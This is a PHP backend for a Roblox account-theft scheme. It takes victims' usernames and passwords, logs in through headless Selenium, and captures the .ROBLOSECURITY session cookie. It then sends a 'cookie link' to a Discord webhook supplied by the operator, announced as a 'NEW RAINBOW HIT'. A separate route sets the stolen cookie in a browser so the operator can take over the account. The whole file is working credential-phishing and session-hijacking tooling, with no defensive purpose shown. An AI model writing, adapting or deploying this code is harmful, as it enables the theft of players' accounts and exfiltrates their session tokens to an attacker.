<?php
require_once __DIR__ . '/vendor/autoload.php'; // For Composer autoload

use Facebook\WebDriver\Remote\RemoteWebDriver;
use Facebook\WebDriver\Remote\DesiredCapabilities;
use Facebook\WebDriver\WebDriverBy;

// IMPORTANT: Replace with the actual URL of your Selenium server and ChromeDriver/GeckoDriver
// For local testing, you'd start chromedriver with `chromedriver --port=4444`
// Or the Selenium Standalone server with `java -jar selenium-server-standalone-<version>.jar standalone --selenium-manager true`
$seleniumServerUrl = 'http://localhost:4444/wd/hub'; // Default for Selenium Standalone Server (v3/4.x)
// Or 'http://localhost:4444' if running chromedriver directly

// Global cookie store (still in-memory, same warning as Node.js version applies)
$cookieStore = [];

// --- Route Handling (simplified for demonstration) ---
// In a real PHP application, you'd use a framework (Laravel, Symfony) or a router.
// For this example, we'll simulate routes based on request URI.

$requestUri = $_SERVER['REQUEST_URI'];
$requestMethod = $_SERVER['REQUEST_METHOD'];

// Handle POST /login
if ($requestMethod === 'POST' && strpos($requestUri, '/login') === 0) {
    handleLogin($seleniumServerUrl, $cookieStore);
}
// Handle GET /cookie/:id
else if ($requestMethod === 'GET' && preg_match('/^\/cookie\/(\d+)$/', $requestUri, $matches)) {
    $id = $matches[1];
    handleGetCookie($id, $cookieStore);
}
// Handle GET / (serve frontend HTML)
else if ($requestMethod === 'GET' && $requestUri === '/') {
    serveFrontendHtml();
}
// Handle 404 Not Found
else {
    http_response_code(404);
    echo json_encode(['message' => 'Not Found']);
}

/**
 * Handles the login attempt using Selenium.
 */
function handleLogin($seleniumServerUrl, &$cookieStore) {
    header('Content-Type: application/json');

    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    $username = $data['username'] ?? null;
    $password = $data['password'] ?? null;
    $webhookURL = $data['webhookURL'] ?? null;
    $info = $data['info'] ?? null;

    if (!$username || !$password || !$webhookURL) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Missing username, password, or webhookURL.']);
        return;
    }

    $driver = null;
    try {
        // Set up Chrome options for headless mode
        $chromeOptions = new \Facebook\WebDriver\Chrome\ChromeOptions();
        $chromeOptions->addArguments([
            '--headless=new', // Or '--headless' for older versions
            '--no-sandbox',
            '--disable-gpu', // Often needed in headless environments
            '--window-size=1280,800',
            '--disable-notifications',
            '--disable-dev-shm-usage'
        ]);

        $capabilities = DesiredCapabilities::chrome();
        $capabilities->setCapability(\Facebook\WebDriver\Chrome\ChromeOptions::CAPABILITY, $chromeOptions);
        $capabilities->setCapability('acceptInsecureCerts', true); // Useful for some environments

        // Create a new WebDriver instance (connect to Selenium Server)
        $driver = RemoteWebDriver::create($seleniumServerUrl, $capabilities);

        // Set an implicit wait (waits for elements to appear)
        $driver->manage()->timeouts()->implicitlyWait(10); // 10 seconds

        echo "[Selenium] Navigating to Roblox login page...\n";
        $driver->get('https://www.roblox.com/login');

        // Wait for username input field
        $driver->wait(15, 100)->until(
            Facebook\WebDriver\WebDriverExpectedCondition::presenceOfElementLocated(WebDriverBy::id('login-username'))
        );

        echo "[Selenium] Typing username and password...\n";
        $driver->findElement(WebDriverBy::id('login-username'))->sendKeys($username);
        $driver->findElement(WebDriverBy::id('login-password'))->sendKeys($password);

        echo "[Selenium] Clicking login button...\n";
        $driver->findElement(WebDriverBy::id('login-button'))->click();

        // Wait for navigation or error
        // This is tricky with Selenium directly. You often need to poll the URL or look for specific elements.
        // For simplicity, we'll wait for URL change or an error message.
        $loggedIn = false;
        $errorMessage = '';
        $timeout = time() + 25; // 25 second timeout

        while (time() < $timeout) {
            $currentUrl = $driver->getCurrentURL();
            if (strpos($currentUrl, 'roblox.com/home') !== false || strpos($currentUrl, 'roblox.com/users') !== false) {
                $loggedIn = true;
                break;
            }

            // Check for common error messages
            try {
                $errorElements = $driver->findElements(WebDriverBy::cssSelector('.feedback-message.error, .alert-danger, .notification-red, .text-error'));
                if (!empty($errorElements)) {
                    $errorMessage = $errorElements[0]->getText();
                    break;
                }
            } catch (\Exception $e) {
                // Element not found, continue
            }

            // Check for CAPTCHA/2FA indicators
            $pageSource = $driver->getPageSource();
            if (strpos($pageSource, 'Please complete the verification') !== false || strpos($pageSource, 'human verification') !== false) {
                $errorMessage = 'Roblox requires human verification (CAPTCHA/Challenge). Automation cannot proceed.';
                break;
            }
            if (strpos($pageSource, 'Incorrect username or password') !== false || strpos($pageSource, 'An unexpected error occurred') !== false) {
                $errorMessage = 'Roblox login failed: Incorrect credentials or unexpected error on Roblox side.';
                break;
            }

            sleep(1); // Wait 1 second before re-checking
        }

        if (!$loggedIn) {
            if ($errorMessage) {
                http_response_code(200);
                echo json_encode(['success' => false, 'message' => "Roblox login failed: {$errorMessage}"]);
                return;
            } else {
                http_response_code(200);
                echo json_encode(['success' => false, 'message' => 'Login flow interrupted, possibly due to a CAPTCHA, 2FA, or other security check on Roblox.']);
                return;
            }
        }

        echo "[Selenium] Successfully navigated. Attempting to extract .ROBLOSECURITY cookie...\n";
        $cookies = $driver->manage()->getCookies();
        $robloxCookie = null;
        foreach ($cookies as $cookie) {
            if ($cookie->getName() === '.ROBLOSECURITY') {
                $robloxCookie = $cookie;
                break;
            }
        }

        if ($robloxCookie) {
            $cookieValue = $robloxCookie->getValue();
            echo "Roblox cookie captured successfully!\n";

            $randomNumber = mt_rand(100000, 999999);
            // IMPORTANT: Replace 'https://yourdomain.com' with your actual deployed domain
            $cookieLink = "https://yourdomain.com/cookie/{$randomNumber}";

            // Store in global cookie store (still in-memory)
            $GLOBALS['cookieStore'][$randomNumber] = ['cookie' => $cookieValue, 'info' => $info];
            echo "Cookie stored in memory with ID: {$randomNumber}\n";

            http_response_code(200);
            echo json_encode(['success' => true, 'cookieLink' => $cookieLink]);

            // Send Discord webhook notification (using cURL for PHP)
            echo "Sending Discord webhook notification...\n";
            $ch = curl_init($webhookURL);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                "username" => "VMYT Hitter",
                "avatar_url" => "https://cdn.discordapp.com/attachments/1391913953034240114/1392772737881210931/DISCORDPFPFORBOT.webp?ex=6870c031&is=686f6eb1&hm=30be0bd34dda7a3a90655d48bd93e883ab2fca991df906d243982389faeb3081&",
                "content" => "@everyone 🚀 **𝗡𝗘𝗪 𝗥𝗔𝗜𝗡𝗕𝗢𝗪 𝗛𝗜𝗧!**\n\n🔗 **Cookie Link:** {$cookieLink}",
                "embeds" => [$info]
            ]));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpcode >= 200 && $httpcode < 300) {
                echo "Discord webhook sent successfully.\n";
            } else {
                echo "Failed to send Discord webhook. HTTP Status: {$httpcode}, Response: {$response}\n";
            }

        } else {
            http_response_code(200);
            echo json_encode(['success' => false, 'message' => 'Failed to capture .ROBLOSECURITY cookie. This often indicates incorrect credentials, CAPTCHA, 2FA, or Roblox security measures preventing cookie access.']);
        }

    } catch (\Exception $e) {
        http_response_code(500);
        echo json_encode(['success' => false, 'message' => "Login failed due to a server-side error: " . $e->getMessage()]);
        error_log("Selenium error: " . $e->getMessage() . " on line " . $e->getLine() . " in " . $e->getFile());
    } finally {
        if ($driver) {
            echo "[Selenium] Quitting browser...\n";
            $driver->quit();
        }
    }
}

/**
 * Handles the cookie retrieval and redirection.
 */
function handleGetCookie($id, &$cookieStore) {
    if (isset($cookieStore[$id])) {
        $cookieData = $cookieStore[$id];
        echo "Cookie data found for ID: {$id}. Setting .ROBLOSECURITY cookie in response.\n";

        // IMPORTANT: Replace 'yourdomain.com' with your actual domain.
        // For local testing, use 'localhost'.
        // Ensure HTTPS for 'Secure' flag in production.
        header("Set-Cookie: .ROBLOSECURITY={$cookieData['cookie']}; Path=/; Domain=yourdomain.com; HttpOnly; Secure; SameSite=Lax");
        
        // Redirect the user to Roblox
        header('Location: https://www.roblox.com/home');
        http_response_code(302); // Found
        
        // OPTIONAL: Delete the cookie from the store after it's used once
        unset($cookieStore[$id]);
        echo "Cookie for ID: {$id} deleted from store after use.\n";
    } else {
        http_response_code(404);
        echo json_encode(['message' => 'Cookie not found or has expired/been used.']);
    }
}

/**
 * Serves the frontend HTML file.
 */
function serveFrontendHtml() {
    header('Content-Type: text/html');
    readfile(__DIR__ . '/index.html'); // Assuming index.html is in the same directory
}

?>
